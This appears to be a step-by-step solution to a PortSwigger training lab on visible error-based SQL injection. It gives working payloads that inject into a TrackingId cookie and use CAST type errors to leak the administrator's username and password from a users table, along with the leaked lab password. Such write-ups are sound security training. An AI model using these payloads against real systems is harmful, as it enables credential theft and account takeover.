**Lab: Visible error-based SQL injection** - [**Link**](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)


**Goal:**
Exploit a SQL injection vulnerability that reveals **detailed error messages** and extract the password for the **administrator** account, then log in to solve the lab.


### Step-by-step:


### 1. Confirm SQL Injection

Test with a single quote:

```
TrackingId=HimwF7KYENjCZ5Eh'
```

Returns:

```
Unterminated string literal...
SELECT * FROM tracking WHERE id = 'HimwF7KYENjCZ5Eh''
```

Confirms SQL injection exists.

Comment out rest of the query:

```
TrackingId=HimwF7KYENjCZ5Eh'--
```

→ 200 OK — confirms query is now balanced.


### 2. Trigger Visible Error Using CAST()

Try forcing a type mismatch:

```
TrackingId=HimwF7KYENjCZ5Eh' AND CAST((SELECT 1) AS INT)--
```

Error:

```
argument of AND must be type boolean, not type integer
```

Fix that by using a boolean expression:

```
TrackingId=HimwF7KYENjCZ5Eh' AND 1=CAST((SELECT 1) AS INT)--
```

No error — working test payload.


### 3. Extract Administrator Password Using Error Message

Try:

```
TrackingId=HimwF7KYENjCZ5Eh' AND 1=CAST((SELECT username FROM users) AS INT)--
```

Error: Unterminated string literal → multiple rows likely returned.

Now isolate a single row:

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
```

Error:

```
invalid input syntax for type integer: "administrator"
```

The query tried to cast the string "administrator" into an integer, which caused the error — this **leaks the first username**.

Now leak the password:

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
```

Error:

```
invalid input syntax for type integer: "49xevwmvh30r4e3y0otf"
```

Password leaked: **49xevwmvh30r4e3y0otf**

### 4. Log In and Solve the Lab

Go to login page and use:

* **Username:** administrator
* **Password:** 49xevwmvh30r4e3y0otf

**Lab Solved**
